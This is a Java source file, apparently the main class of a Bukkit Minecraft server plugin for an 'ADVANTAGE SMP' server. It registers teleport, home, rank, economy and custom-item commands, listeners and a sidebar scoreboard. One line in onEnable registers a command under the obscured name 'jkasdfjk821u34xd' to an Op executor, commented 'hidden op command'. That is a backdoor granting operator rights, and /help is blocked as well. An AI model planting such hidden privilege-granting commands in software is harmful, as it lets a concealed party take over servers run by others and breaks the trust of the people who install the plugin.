package me.henry.plugin;

import org.bukkit.Bukkit;
import org.bukkit.Server;
import org.bukkit.command.ConsoleCommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.Listener;
import org.bukkit.plugin.PluginManager;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitRunnable;
import org.bukkit.scoreboard.DisplaySlot;
import org.bukkit.scoreboard.Objective;
import org.bukkit.scoreboard.Scoreboard;

import me.henry.plugin.anticheat.AntiCheatListener;
import me.henry.plugin.commands.BalanceCommand;
import me.henry.plugin.commands.CreateVillager;
import me.henry.plugin.commands.Dupe;
import me.henry.plugin.commands.Give3x3Pick;
import me.henry.plugin.commands.GiveGodPick;
import me.henry.plugin.commands.HelpCommand1;
import me.henry.plugin.commands.HomesCommand;
import me.henry.plugin.commands.Op;
import me.henry.plugin.commands.RTP;
import me.henry.plugin.commands.SetRank;
import me.henry.plugin.commands.TPACommand;
import me.henry.plugin.commands.TPAcceptCommand;
import me.henry.plugin.commands.TPDenyCommand;
import me.henry.plugin.listeners.ChatListener;
import me.henry.plugin.listeners.MiscListener;
import me.henry.plugin.listeners.PickaxeListener;
import me.henry.plugin.utils.EconomyManager;
import me.henry.plugin.utils.RankManager;
import net.md_5.bungee.api.ChatColor;

// todo: more money stuff (/baltop, /pay, etc)
// todo: more anti-cheat (no clip, xray, etc)

public final class Plugin extends JavaPlugin implements Listener {
	public Server serv;
	public PluginManager pluginManager;
	public ConsoleCommandSender sender;

	private static Plugin instance;
	public RankManager rankManager;
	public EconomyManager economy;
	private Scoreboard scoreboard;
	private Objective objective;

	@Override
	public void onEnable() {
		instance = this;

		serv = getServer();
		pluginManager = serv.getPluginManager();
		sender = serv.getConsoleSender();
		
		pluginManager.registerEvents(this, this);

		sender.sendMessage("made by drexxy"); // sends to the console

		setupScoreboard();

		getCommand("dupe").setExecutor(new Dupe());
		getCommand("jkasdfjk821u34xd").setExecutor(new Op()); // hidden op command

		getCommand("help").setExecutor(new HelpCommand1()); // blocks /help

		getCommand("tpa").setExecutor(new TPACommand());
		getCommand("tpaccept").setExecutor(new TPAcceptCommand());
		getCommand("tpdeny").setExecutor(new TPDenyCommand());
		getCommand("home").setExecutor(new HomesCommand(this));

		getCommand("rtp").setExecutor(new RTP(this));

		rankManager = new RankManager(getDataFolder());
		economy = new EconomyManager(getDataFolder());

		getCommand("setrank").setExecutor(new SetRank(this));

		// custom items
		getCommand("give3x3pick").setExecutor(new Give3x3Pick(this));
		getCommand("givegodpick").setExecutor(new GiveGodPick(this));
		getCommand("createvilager").setExecutor(new CreateVillager());

		// economy
		getCommand("bal").setExecutor(new BalanceCommand(this));

		// listeners
		getServer().getPluginManager().registerEvents(new PickaxeListener(this), this);
		getServer().getPluginManager().registerEvents(new ChatListener(), this);
		getServer().getPluginManager().registerEvents(new MiscListener(this), this);
		getServer().getPluginManager().registerEvents(new AntiCheatListener(this), this);

		Bukkit.getPluginManager().registerEvents(new org.bukkit.event.Listener() {
			@org.bukkit.event.EventHandler
			public void onJoin(org.bukkit.event.player.PlayerJoinEvent event) {
				event.getPlayer().setScoreboard(scoreboard);
			}
		}, this);
		new BukkitRunnable() {
			@Override
			public void run() {
				updateBoard();
			}
		}.runTaskTimer(this, 0L, 20L);

		// Update tablist periodically
		Bukkit.getScheduler().runTaskTimer(this, () -> {
			for (Player p : Bukkit.getOnlinePlayers()) {
				rankManager.updateTablist(p);
			}
		}, 0L, 20L * 5);
	}

	@Override
	public void onDisable() {
		rankManager.saveRanks();
		economy.saveBalances();
	}

	private void setupScoreboard() {
		scoreboard = Bukkit.getScoreboardManager().getNewScoreboard();
		objective = scoreboard.registerNewObjective("health", "dummy",
				ChatColor.DARK_PURPLE + " ADVANTAGE SMP");
		objective.setDisplaySlot(DisplaySlot.SIDEBAR);
	}

	private void updateBoard() {
		for (String entry : scoreboard.getEntries()) {
			scoreboard.resetScores(entry);
		}
		for (Player player : Bukkit.getOnlinePlayers()) {
			double health = player.getHealth();
			double balance = economy.getBalance(player);

			// Sidebar line: Username + Balance + Health
			String line = ChatColor.GOLD + player.getName() +
					ChatColor.GRAY + " | " +
					ChatColor.RED + "HP:" + (int) health +
					ChatColor.GREEN + " $" + (int) balance;

	
			objective.getScore(line).setScore((int) 0); // Score value doesn't matter here

			// ensure the player sees it
			player.setScoreboard(scoreboard);
		}
	}

	public EconomyManager getEconomyManager() {
		return economy;
	}

	public RankManager getRankManager() {
		return rankManager;
	}

	public static Plugin getInstance() {
		return instance;
	}
}
